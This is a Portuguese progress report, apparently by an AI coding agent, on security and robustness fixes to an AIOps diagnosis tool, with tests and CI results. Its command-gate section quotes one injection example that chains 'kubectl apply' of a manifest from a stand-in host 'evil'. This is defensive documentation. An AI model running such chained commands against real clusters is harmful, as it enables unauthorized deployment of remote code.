# Progresso das correções P1

Origem: §5 "P1 — antes de qualquer uso fora do laboratório" de
[`analise-20261109.md`](analise-20261109.md). Os itens seguem a ordem de
gravidade. Cada item tem testes próprios e um commit local; nada foi enviado
para o remoto (sem push e sem PR).

**Como "verde" é medido:** os comandos `pytest` dos três jobs do CI
(`.github/workflows/ci.yml`), cada um no ambiente equivalente e com o status de
saída real:

- **unit:** `pytest tests/ -m unit --ignore=tests/rust`, só com as dependências
  mínimas do job;
- **integration:** `pytest tests/ -m "integration or snapshot"`, com o
  `requirements.txt` completo;
- **rust-build:** `pytest tests/`, com a extensão Rust compilada e instalada.

O CI não tem lint nem formatação, então não há outro comando a rodar.

| # | Item | IDs | Estado | Commit |
|---|---|---|---|---|
| 1 | Laço do orchestrator com saída e chamadas ao LLM limitadas; timeout no cliente | F01 | feito | `74a26d5` |
| 2 | Gate de comando: metacaracteres de shell, âncora, nome de serviço | F02, T04, SEC-05, SEC-06 | feito | `27f9d39` |
| 3 | CLI usa o veredito agregado de todas as camadas | F03 | feito | `f4d2069` |
| 4 | Template de CPU no mitigator | NOVO-01 | feito | `46ac43e` |
| 5 | Safety ligada no pipeline V1 (`proposed_action`) | ARQ-01, F04, SEC-04 | feito | `5ddec40` |
| 6 | OAuth: autenticação do cliente em `/auth/token/register` | SEC-01, SEC-11, 4B-07 | feito (aud/iss → P2) | `41b3b50` |
| 7 | Falhas silenciosas: log em vez de `except: pass`; `confidence` tipada; chamada morta a `step_predict` | F07, F5-02, ARQ-05, F5-01 | feito (ruff no CI → Allan) | `1bd50ca` |

## Item 1 — F01: laço do AgentOrchestrator

**Defeito.** O `while` de `AgentOrchestrator.run` só saía por `finalize` ou por
estourar o número de replans. Se toda reflexão devolvia `"continue"`, o mesmo
plano rodava de novo para sempre. Isso acontecia em qualquer falha do LLM,
porque o fallback de `_reflect_on_step` é `"continue"`. No relatório, foram
3,46 milhões de chamadas em 5 s.

**Correção:**

- `agents/orchestrator.py`:
  - **Plano esgotado:** um `for … else: break` faz o plano esgotado sem
    `finalize`/`replan` sair do laço e sintetizar o diagnóstico com o que foi
    coletado.
  - **Tamanho do plano:** `MAX_STEPS_PER_PLAN = 8` limita os planos e replans
    vindos do LLM. O total de reflexões por run fica em no máximo
    `(MAX_REPLANS + 1) × 8`.
  - **Síntese:** uma síntese que não é `dict` ou não traz `root_cause` (`{}`,
    lista, `null`) cai no diagnóstico heurístico. Antes, `{}` também mantinha o
    laço girando.
- `adapters/llm/anthropic_client.py`: a factory passa `timeout=60.0` e
  `max_retries=2` explícitos. Todos os pontos de produção criam o cliente por
  ela.

**Testes:** `tests/test_orchestrator_termination.py`, 10 testes marcados `unit`.

- **Como detecta o laço:** o cliente falso tem orçamento de 50 chamadas e, ao
  estourá-lo, levanta uma `BaseException`, que escapa dos `except Exception`.
  Um laço sem saída vira falha imediata em vez de pendurar a suíte.
- **Antes da correção:** 9 testes falharam pelo defeito. Os três de laço
  falharam por estourar o orçamento. O teste de replan falhou por um erro no
  próprio teste, corrigido depois, e não foi reverificado contra o código
  antigo.
- **Cenários cobertos:**
  - LLM sempre falhando;
  - LLM sempre respondendo `continue`;
  - JSON dentro de cercas `` ```json ``;
  - plano e replan com 1000 steps;
  - síntese sem `root_cause`;
  - timeout explícito na factory.

**CI local:** unit 690 passaram, integration 138 passaram, suíte completa 1381
passaram e 10 foram pulados. Status 0 nos três.

**Fica para o Allan:** o valor de 60 s de timeout é um palpite razoável, não
uma medição. Vale ajustá-lo com a latência real do modelo em uso.

## Item 2 — F02/T04/SEC-05/SEC-06: gate de comando e nome de serviço

**Defeito.** A allow-list do `PreExecutionValidator` usava `re.search`, sem
âncora. Um prefixo read-only aprovava qualquer coisa encadeada depois dele:
`kubectl get pods; kubectl apply -f http://evil/x.yaml` saía
`AUTO_APPROVED`. Além disso, o nome de serviço vindo da telemetria ou do LLM
era interpolado cru em `kubectl rollout undo deployment/{service}`.

**Correção:**

- `safety/pre_validator.py`:
  - **Metacaracteres:** `SHELL_METACHARACTERS` (`; & | < >`, `\n`, `\r`)
    bloqueia o comando antes de qualquer allow-list, com status `BLOCKED`.
  - **Âncora:** os padrões de leitura e de rollout passam a usar `re.match`,
    que casa só no início do comando.
  - Os padrões de alto risco continuam com `re.search`, porque ali casar em
    qualquer posição é o comportamento mais conservador.
- `agents/mitigator.py`:
  - `is_valid_service_name` exige um nome DNS-1123 *subdomain* com até 253
    caracteres.
  - **Nome inválido:** a ação sai sem comando, com risco `HIGH` e padrão
    `invalid_service`. Sem comando, o gate não aprova e a decisão vai para um
    humano.
  - Todos os nomes de serviço usados em `data/` e nos snapshots já estão
    nesse formato, e nenhum snapshot mudou.

**Testes:** `tests/test_command_gate.py`, 33 testes marcados `unit`.

- **Antes da correção:** 21 falharam. Os 12 que passavam eram os de
  comportamento legítimo, que precisam continuar passando.
- **Cenários cobertos:**
  - 10 formas de encadeamento e redirecionamento;
  - padrão permitido no meio do comando;
  - 8 comandos legítimos que continuam seguros;
  - 7 nomes de serviço inválidos e 4 válidos;
  - o caminho de ponta a ponta: serviço injetado → mitigator → gate.

**CI local:** unit 723 passaram, integration 138 passaram, suíte completa 1414
passaram e 10 foram pulados. Status 0 nos três.

**Efeito colateral aceito:** via MCP `validate_action`, qualquer comando com
`>` ou `<` passa a ser bloqueado, por exemplo `pip install 'x>=1.0'`. É
falhar fechado de propósito. Se o MCP precisar validar comandos com
especificador de versão, isso pede uma regra própria, não uma brecha na
allow-list.

## Item 3 — F03: a CLI decide com todas as camadas

**Defeito.** O exit code, o `requires_human` do evento Slack e o status
"AWAITING HUMAN" olhavam só a camada `pre_validator`. O veredito do
VersionValidator, produzido por `step_remediation_validation`, aparecia no
resumo e era descartado na decisão.

Caso real, rodado com as classes de verdade:
`kubectl rollout restart deployment/postgres:9.4` sai `AUTO_APPROVED` no
pre-validator e `MALICIOUS` no VersionValidator. Antes da correção, a CLI
devolvia exit 0.

**Correção** (`main.py`):

- `_requires_human(safety_result, remediation_result)` exige humano se
  qualquer camada bloquear.
- `_record_safety_decision` grava `stages.safety_decision` com
  `requires_human` e `blocked_by`.
- O veredito combinado passa a decidir:
  - o exit code 3;
  - o `requires_human` do Slack;
  - o "AWAITING HUMAN" do resumo;
  - o "Requires Human" do postmortem.

**Testes:** `tests/test_cli_safety_decision.py`, 9 testes marcados `unit`.

- **Antes da correção:** 8 falharam. O teste de exit code confirmou o
  defeito: `main()` devolvia 0 com o VersionValidator bloqueando.
- **Cenários cobertos:**
  - as 6 combinações de camadas;
  - as duas etapas reais com o comando acima, sem dublês nas camadas;
  - o `main()` devolvendo 3 quando só o VersionValidator bloqueia, e 0 quando
    todas aprovam.

**CI local:** unit 732 passaram, integration 138 passaram, suíte completa 1423
passaram e 10 foram pulados. Status 0 nos três.

**Observação, fora do P1:** `kubectl set image deployment/api
api=nginx:1.16.1` passa como `SAFE` no VersionValidator. É o achado F08 do
relatório (comparação exata de versão), que é P2.

## Item 4 — NOVO-01: template de CPU no mitigator

**Defeito.** O template de CPU era `--replicas={current+2}`. `str.format` trata
`current+2` como nome de campo, então qualquer causa raiz com "cpu" levantava
`KeyError: 'current+2'` em `MitigationAgent.propose`. O `AgentOrchestrator`
não trata essa exceção.

**Correção** (`agents/mitigator.py`): o template passa a usar `{scale_up}`, e
`propose` calcula os campos antes do `format`
(`scale_up = current_replicas + 2`). Todos os templates recebem o mesmo
dicionário de campos.

**Testes:** `tests/test_mitigator_templates.py`, 8 testes marcados `unit`.

- **Antes da correção:** falharam exatamente os 3 testes de CPU.
- **Cenários cobertos:**
  - cada padrão de `REMEDIATION_PATTERNS` passa por `propose()` e precisa
    gerar um comando sem `{}` sobrando. Isso pega qualquer template quebrado
    no futuro;
  - o comando de CPU exato;
  - o gate trata o comando de CPU como rollout reversível.

**CI local:** unit 740 passaram, integration 138 passaram, suíte completa 1431
passaram e 10 foram pulados. Status 0 nos três.

## Item 5 — ARQ-01/F04/SEC-04: safety ligada no pipeline V1

**Defeito.** Nenhum node do grafo Blueprint preenchia `state.proposed_action`.
Por isso `version_validator`, `pre_validator` e `tnr` sempre faziam *skip*, e
o `main_v1` terminava com exit 0. Os nodes de safety funcionavam quando
recebiam a ação: os testes deles passaram antes da correção. O que faltava era
a fiação.

**Correção:**

- `blueprint/adapters/pipeline_nodes.py`:
  - `proposed_action_from_mitigation` converte a ação do `MitigationAgent` no
    dicionário que os safety nodes leem.
  - O node agentic usa `outcome.mitigation`.
  - O fallback heurístico (`--no-llm`) chama `MitigationAgent.propose`, como o
    caminho com LLM já fazia dentro do orchestrator.
- `blueprint/adapters/safety_nodes.py`: sem *snapshots* de saúde pré e pós,
  o TNR registra `"TNR: not verified — …"` em `safety_reasons` em vez de
  passar em silêncio. Não inventei *snapshots*: não há medição pós-ação real,
  e esse é o item S5 do P2.
- `main.py` (`main_v1`): `safety_verdict == "NEEDS_REVIEW"` passa a devolver
  exit 3, como no V0. Uma ação bloqueada já abortava o pipeline com
  `PipelineAborted` e exit 3; agora ela de fato chega a ser bloqueada.

**Mudança de comportamento, medida:** no cenário padrão com `--no-llm`, o V1
passa a devolver **3**, igual ao V0, que eu rodei no mesmo cenário. O
diagnóstico afeta 4 serviços, acima do limite de 3, e a ação vai para
revisão. O teste `test_story_1_8_wire_main.py::test_main_v1_no_llm_no_rag`
fixava o exit 0 do defeito e foi atualizado. De quebra, ele passou a usar
`tmp_path` em vez de gravar em `/tmp/aiops-test-output`.

**Testes:** `tests/test_blueprint_safety_wiring.py`, 9 testes marcados
`unit`.

- **Antes da correção:** 4 falharam:
  - a ação proposta ficava `None`;
  - um comando encadeado não abortava o pipeline;
  - o `main_v1` devolvia 0 tanto para um comando bloqueado quanto para um que
    exige revisão.
- **Cenários cobertos:**
  - a conversão da ação;
  - os nodes reais bloqueando um comando encadeado e uma versão vulnerável;
  - o pipeline real em `--no-llm` chegando às 3 camadas;
  - o bloqueio abortando a engine;
  - os exit codes do `main_v1`.

**CI local:** unit 750 passaram, integration 138 passaram, suíte completa 1441
passaram e 10 foram pulados. Status 0 nos três.

**Acompanhamento para o P2:** a rota A2A captura o `PipelineAborted` de um
bloqueio de safety e devolve um `pipeline_error` genérico ("diagnosis
failed"). Isso falha fechado, mas não diz que foi bloqueio. Vale tratar junto
com o ARQ-10 (artefato de mitigação da A2A).

## Item 6 — SEC-01: autenticação do cliente no OAuth

**Defeito.** `/auth/token/register` emitia JWT para quem soubesse um
`client_id`, e os ids estão publicados em `config/defaults.yaml`. O PKCE não
autenticava ninguém, porque verifier e challenge chegam no mesmo corpo.
Antes da correção, o ataque do relatório (só `client_id` público + PKCE
gerado na hora) recebia **200**, conferido no teste.

**Correção:**

- `config/loader.py`: `OAuthClientConfig.secret_sha256` guarda o SHA-256 hex
  do segredo do cliente, nunca o segredo.
- `interfaces/http/app.py`: o `create_app` repassa esse hash ao servidor
  OAuth.
- `auth/server.py`:
  - `RegisterRequest.client_secret` (`client_secret_post`) é conferido contra
    o hash com `hmac.compare_digest`.
  - **Falha fechada:** cliente sem hash bem formado não recebe token, e a
    resposta é a mesma (401 "Invalid client credentials") para segredo
    ausente, errado ou não configurado.
  - O discovery passa a anunciar `client_secret_post` em vez de `none`.
  - No modo só-RSA, o endpoint devolve **503** explícito em vez de **500**
    (4B-07). A emissão continua só HS256.
- `config/defaults.yaml`: comentário explicando o campo e como gerar o hash
  sem gravar o segredo em disco.

**Testes:**

- `tests/test_oauth_client_auth.py`, 8 testes marcados `unit`. Antes da
  correção, 6 falharam.
- **Cenários cobertos:**
  - PKCE sem segredo;
  - segredo errado;
  - cliente sem hash configurado;
  - caminho feliz;
  - segredo certo com PKCE errado (400);
  - discovery;
  - modo só-RSA (503);
  - fiação via `create_app`.
- **Testes antigos atualizados:** `tests/test_oauth_mcp.py` e
  `tests/test_a2a_simulation.py` passaram a configurar o hash e enviar
  `client_secret`. Eram os 6 testes que chamavam o registro sem
  autenticação. Os segredos de teste são gerados em tempo de execução com
  `secrets.token_urlsafe`.

**CI local:** unit 758 passaram, integration 138 passaram, suíte completa 1449
passaram e 10 foram pulados. Status 0 nos três.

**Fica para o Allan (precisa de credencial ou decisão de implantação):**

- **Gerar e distribuir os segredos** dos clientes `assistant-agent`,
  `databricks-mcp` e `sre-orchestrator` e configurar os `secret_sha256`.
  Até isso acontecer, nenhum cliente recebe token por este endpoint. Isso
  é intencional. Cuidados (ver item 8):
  - o segredo deve ser aleatório, com pelo menos 32 bytes;
  - o hash não deve ir para o `defaults.yaml` versionado;
  - só a configuração via YAML/`AppConfig` foi testada. Sobrescrever
    essa lista por variável de ambiente não foi verificado.
- **`aud`/`iss` nos tokens (SEC-11):** depende de uma URL de emissor
  definida (hoje `create_app` passa `base_url=""`) e de mudar em conjunto os
  validadores do A2A, do SSE e do introspect. Fica para o P2.
- **Emissão RS256:** hoje só HS256. O discovery ainda anuncia
  `id_token_signing_alg_values_supported: RS256` quando há par RSA; vale
  alinhar junto com a emissão RS256.

## Item 7 — F07/F5-02, ARQ-05/F5-01: falhas silenciosas

**Defeito.** Três defeitos funcionais ficavam invisíveis porque o erro era
engolido por `except Exception: pass`:

- a memória institucional nunca gravava, porque `float("medium")` levantava
  `ValueError`;
- o bloco "2c. Predictive Stage" chamava `step_predict` com a assinatura
  errada. Além disso, criava `data/incident_memory.db` a cada execução;
- a busca MCP devolvia texto sem redação de PII quando o sanitizer falhava
  (a parte de PII de 4B-03/SEC-08).

**Correção:**

- **`domain/confidence.py`** (puro): `confidence_to_score` é a conversão
  única de confiança, com a escala `high` 0,85 · `medium` 0,5 · `low` 0,25.
  Substitui 6 pontos com 2 escalas diferentes: 3 no `main.py` (o do
  `main_v1` mandava 0.0 ao Slack sempre que a confiança vinha em texto), 1
  na persistência e 2 em `slack.py`.
- **Escala no Slack:** `slack.py` usava 0,9/0,6/0,3. As cores do indicador
  não mudam (limiares 0,8 e 0,5); muda só o percentual exibido quando a
  confiança chega em texto.
- **`main.py`:**
  - `step_persist_incident` extrai o bloco 5d e registra a falha em log.
  - A chamada morta a `step_predict` saiu. A predição real continua na
    etapa 4d.
  - Os blocos best-effort de precedentes e de evolução de skills passaram a
    registrar a falha em log.
- **Outros 7 `except Exception: pass` trocados por log:**
  - fallback de auditoria em `telemetry_sanitizer`, `pre_validator`, `tnr` e
    `version_validator`;
  - histórico do `rag/indexer`;
  - side-effects de falso positivo em `accuracy`;
  - normalização em `mcp/tools`.
- **Exceção, PII (`interfaces/mcp/tools.py::_sanitize_result`):** em vez de
  logar e devolver o texto original, o campo vira
  `"[redacted: sanitizer unavailable]"` (falha fechada).
  **Efeito colateral:** como o `TelemetrySanitizer` real não tem
  `sanitize_text` (4B-03, P2), a busca MCP passa a devolver os campos de
  texto redigidos até esse item ser corrigido.
- **Restam 7 handlers que só fazem `pass`, todos estreitos e legítimos:**
  `ImportError` de dependência opcional (2), `asyncio.CancelledError` (4) e
  `WebSocketDisconnect` (1).

**Testes:** `tests/test_silent_failures.py`, 26 testes marcados `unit`.

- **Portão determinístico:** um teste varre o código de produção por AST e
  falha se aparecer um handler amplo com corpo só `pass`. Ele roda no job
  unit do CI, sem depender de linter.
- **Antes da correção:** 9 testes falharam.
- **Ajuste no instrumento:** o teste da chamada morta falhava inicialmente
  por `AttributeError` (a função `step_persist_incident` ainda não existia),
  e não pelo defeito. Por isso validei o instrumento em duas etapas: com a
  persistência já extraída e a chamada morta ainda presente, ele acusou
  `['bad-signature', 'ok']`. Só depois removi a chamada.
- **Cenários cobertos:**
  - o portão AST;
  - 15 conversões de confiança;
  - persistência de `"medium"`, `"low"`, `"high"` e `0.7` num SQLite em
    `tmp_path`;
  - falha de gravação registrada em log;
  - `step_predict` chamado só com a assinatura real;
  - redação na busca MCP, tanto com sanitizer que levanta quanto sem o
    método.

**Medido na CLI real:** `python main.py --no-llm --no-rag`, rodado 2 vezes com
o banco limpo, deixou **2 linhas** em `incidents` (confiança 0,5). Não refiz
essa mesma medição antes da correção; o defeito anterior está demonstrado
pelos testes.

**CI local:** unit 782 passaram, integration 138 passaram, suíte completa 1473
passaram e 10 foram pulados. Status 0 nos três.

**Fica para o Allan:** colocar `ruff` (lint e format, com BLE001 e S110) como
step do CI exige editar `.github/workflows/ci.yml`, que estava fora de alcance
na análise. Não mexi. O portão AST acima já cobre o caso mais grave dentro da
suíte de testes.

---

## Fechamento do P1

Os sete itens estão feitos, cada um num commit local próprio, com testes e com
os três jobs de pytest do CI rodados com status 0. Nada foi enviado ao remoto.

**Pendências que dependem do Allan:**

| Pendência | Por quê | Origem |
|---|---|---|
| Gerar e distribuir os segredos dos clientes OAuth e configurar os `secret_sha256` | Envolve credencial; até lá, nenhum cliente recebe token por `/auth/token/register`, de propósito | Item 6 |
| Definir a URL de emissor e adotar `aud`/`iss` nos tokens | Decisão de implantação, com mudança coordenada nos validadores do A2A, do SSE e do introspect | Item 6 (P2) |
| Adicionar `ruff` como step do CI | Exige editar `.github/` | Item 7 |
| Ajustar o timeout de 60 s do cliente LLM com a latência real | Valor escolhido, não medido | Item 1 |
| Push e PR destes commits | Fora do que foi autorizado nesta sessão | — |

**Efeitos colaterais conscientes, para revisão:**

- `pre_validator`: qualquer comando com `;`, `&`, `|`, `<`, `>` ou quebra de
  linha passa a ser bloqueado, inclusive via MCP `validate_action` (item 2).
- `main_v1` no cenário padrão com `--no-llm`: exit 3, igual ao V0 (item 5).
- Busca MCP: campos de texto redigidos até o 4B-03 ser corrigido (item 7).
- Slack: o percentual exibido para confiança em texto segue a escala única
  (item 7).

---

## Item 8 — Correções após a revisão final

Uma revisão independente apontou três problemas de isolamento que a minha
verificação escondia. Eu rodava a suíte com `env -i` e um runner que apagava
os artefatos depois de cada execução.

**1. A suíte passou a gravar incidentes falsos na memória real.** Isso é efeito
do item 7: o `save_incident` voltou a funcionar, e os testes que rodam `main()`
usam o caminho padrão `data/incident_memory.db`. É o arquivo que a CLI real lê
como precedentes e chunks `[HISTORICAL]`.

- **Medido sem limpeza:** o job unit deixou **6 linhas** falsas
  (`test-scenario` / `test`).
- **Correção:** fixture `autouse` em `tests/conftest.py` que aponta o default
  de caminho dos construtores de `rag.memory`, `rag.indexer` e
  `rag.retriever_history` para `tmp_path`, por teste.
- **Medido depois:** os três jobs, rodados sem limpeza, não criam mais
  `data/incident_memory.db`.
- O `output/postmortem_*.md` continua sendo gravado por testes antigos. É o
  item 12 do P2, e a CLI não lê esses arquivos de volta.

**2. O portão AST varria arquivos que não são do projeto.** O `rglob` na raiz
incluiria `evaluate*.py`, `_bmad/` e venvs com outro nome, que estão no
`.gitignore` e podem existir no checkout do Allan.

- **Correção:** o portão passa a usar `git ls-files`, com uma lista explícita
  de pacotes como fallback.
- **Provado num repositório git descartável no scratchpad:** só o arquivo
  versionado é examinado, e a violação nele continua sendo acusada.

**3. Testes de `main()`/`main_v1()` podiam postar no Slack de verdade.** Os
dois entrypoints leem `.env.local` do diretório atual para `os.environ` e
montam um `SlackNotifier` real se houver `SLACK_BOT_TOKEN`.

- **Correção:** fixture `isolated_cli`, que:
  - desliga o notifier;
  - remove as variáveis de credencial do ambiente;
  - restaura `os.environ` ao fim do teste.
- **Onde foi aplicada:** nos testes que escrevi e nos dois existentes com o
  mesmo risco, `test_exit_codes.py::TestMainExitCodes` e
  `test_story_1_8_wire_main.py::test_main_v1_no_llm_no_rag`.
- **Prova:** `tests/test_cli_isolation.py`.

**Documentação atualizada**, para o P1 não aumentar a defasagem que o relatório
criticou:

- `SECURITY.md`: o registro OAuth com `client_secret` e o gate com bloqueio de
  metacaracteres e allow-list ancorada.
- `config/defaults.yaml`: o segredo deve ser aleatório, com pelo menos 32
  bytes, e o hash não deve ir para arquivo versionado.

Os READMEs já diziam que o cenário padrão termina com exit 3, o que agora vale
também para o V1.

### O que o P1 pedia e não foi feito

| Item | Pendência | Dado medido |
|---|---|---|
| 1 | `blueprint.max_llm_calls: 15` continua sem efeito em produção | Pior caso medido com o laço corrigido: **29 chamadas** ao LLM por execução (replan no 8º step de cada plano). Caso comum, com o LLM sempre respondendo "continue": 11. Antes: sem limite |
| 4 | `mitigator.propose` no orchestrator continua sem `try` | O template quebrado foi corrigido e há teste de tabela para todos os padrões; a chamada em si continua desprotegida |
| 5 | Quando uma camada bloqueia, o `main_v1` chama `display_results` com o estado de antes da execução | Sem diagnóstico nem postmortem na saída, ao contrário do V0. Vale tratar junto com a nota da A2A (P2, ARQ-10) |
| 6 | `aud`/`iss` nos tokens | Ver item 6 |
| 7 | `ruff` no CI | Ver item 7 |

---

## Pendências do P1 resolvidas na segunda rodada

Mesmo método: teste falhando antes, um commit local por item e os três jobs
de pytest do CI com status 0.

### Item 9 — `max_llm_calls` passa a ter efeito (pendência do item 1)

**Defeito.** `config.blueprint.max_llm_calls` (NFR6, padrão 15) só era lido
por `BlueprintEngine.increment_llm_calls`, e esse método só era chamado em
testes. Com o laço já corrigido, o pior caso medido era de **29 chamadas** ao
LLM por execução.

**Correção** (`agents/orchestrator.py`):

- **Contador por execução:** todas as 5 chamadas ao LLM do orchestrator passam
  por `_create_message`, que conta as chamadas da execução (o contador zera a
  cada `run()`) e respeita `config.blueprint.max_llm_calls`. Sem config, vale
  `DEFAULT_MAX_LLM_CALLS = 15`.
- **Ao atingir o limite:** levanta `LLMCallBudgetExhausted`. Essa exceção
  herda de `Exception`, então cada ponto cai no fallback que já tinha (plano
  padrão, `continue`, heurística) e o laço termina.
- **Reserva para a síntese:** plano, reflexões e replans param em
  `limite − 1`. A última chamada fica para a síntese do diagnóstico, que
  senão cairia na heurística. Medido no caso adversarial: sem a reserva, o
  diagnóstico saía "Unknown fault…"; com ela, sai o do LLM.
- **Cliente preservado:** o cliente não é trocado. O `main.py` reusa
  `_orchestrator.client` no `SkillEvolver`, fora do orçamento da execução.
- **Novos campos em `AgentOutcome`:** `llm_calls` e `llm_budget_exhausted`.

**Medido:** pior caso adversarial (replan no 8º step de cada plano) com a
config padrão: **15 chamadas**, antes 29. O diagnóstico final veio do LLM.

**Testes:** `tests/test_orchestrator_llm_budget.py`, 11 testes marcados
`unit`.

- **Antes da correção:** 10 falharam. Os de limite falharam na contagem; o do
  caso normal falhou porque o campo `llm_calls` ainda não existia.
- **Cenários cobertos:**
  - limite padrão e limites 1, 5 e 10;
  - sem config;
  - orçamento por execução (a segunda execução não começa esgotada);
  - cliente não substituído;
  - execução normal não marcada como esgotada;
  - reserva para a síntese com limites 1, 2 e 15.

**CI local:** unit 796 passaram, integration 138 passaram, suíte completa 1487
passaram e 10 foram pulados. Status 0 nos três.

**Observação:** o contador fica no orchestrator, não na `BlueprintEngine`. O
`increment_llm_calls` da engine continua sem chamador em produção. Ligá-lo
exigiria passar o contexto da engine para dentro do node agentic, sem ganho
sobre o limite aplicado na única porta para o LLM.

### Item 10 — Chamada ao mitigador protegida (pendência do item 4)

**Defeito.** `mitigator.propose` era chamado sem proteção em 4 pontos:

- duas vezes em `AgentOrchestrator.run`;
- no caminho heurístico de `main.step_agents`;
- no fallback heurístico do pipeline V1.

Qualquer exceção ali derrubava a execução. No V1, a engine abortava com
"fallback also failed".

**Correção:** `MitigationAgent.propose_safe(diagnosis)` envolve o `propose` num
`try`. Em caso de falha:

- registra o erro em log;
- devolve uma ação de revisão manual: sem comando, risco `HIGH` e padrão
  `proposal_failed`, que o gate nunca auto-aprova;
- emite os mesmos eventos de reporter do caminho normal.

Os 4 pontos passaram a usar `propose_safe`. O `propose` continua igual para
quem testa os templates.

**Testes:** `tests/test_mitigation_guard.py`, 6 testes marcados `unit`.

- **Antes da correção:** todos falharam. O do V1 falhou com
  `PipelineAborted: Node 'diagnoser' fallback also failed: boom`.
- **Cenários cobertos:**
  - falha na primeira proposta do orchestrator;
  - falha na proposta depois do replan por TNR;
  - `propose_safe` sem falha devolve o mesmo que `propose`;
  - a falha vai para o log;
  - caminho heurístico do `main`;
  - pipeline V1 completo, que agora termina em `NEEDS_REVIEW` em vez de
    abortar.

**CI local:** unit 802 passaram, integration 138 passaram, suíte completa 1493
passaram e 10 foram pulados. Status 0 nos três.

### Item 11 — V1 mostra diagnóstico e postmortem num bloqueio (pendência do item 5)

**Defeito.** Num bloqueio de safety, a engine levantava `PipelineAborted` e o
`main_v1` exibia o estado de **antes** da execução. Não aparecia diagnóstico
nem postmortem, embora o diagnóstico já tivesse sido feito. O V0, no mesmo
caso, mostra os dois.

**Correção:**

- `blueprint/engine.py`: o `PipelineAborted` passa a carregar `.state` (o
  estado alcançado antes do node que falhou) e `.node_id`. Vale para os três
  casos de aborto: falha de node, falha do fallback e timeout.
- `main.py`: `_state_after_abort` usa esse estado. Num bloqueio de safety
  (causa `SafetyBlockedError`):
  - marca `safety_verdict="BLOCKED"`, com o motivo em `safety_reasons`;
  - gera o postmortem pelo node de template, que não usa LLM;
  - acrescenta ao postmortem uma seção "## Safety" com a camada que bloqueou
    e o motivo.
- O exit code continua 3.

**Testes:** `tests/test_v1_blocked_output.py`, 3 testes marcados `unit`, com a
fixture `isolated_cli`.

- **Antes da correção:** os 3 falharam:
  - o `PipelineAborted` não tinha `node_id`;
  - a saída não continha o diagnóstico;
  - nenhum postmortem era salvo.
- **Cenários cobertos:**
  - estado e node anexados ao aborto;
  - a saída do `main_v1` bloqueado mostra causa raiz e `BLOCKED`;
  - o postmortem é salvo com a causa raiz, `BLOCKED` e a camada
    `pre_validator`.

**CI local:** unit 805 passaram, integration 138 passaram, suíte completa 1496
passaram e 10 foram pulados. Status 0 nos três.
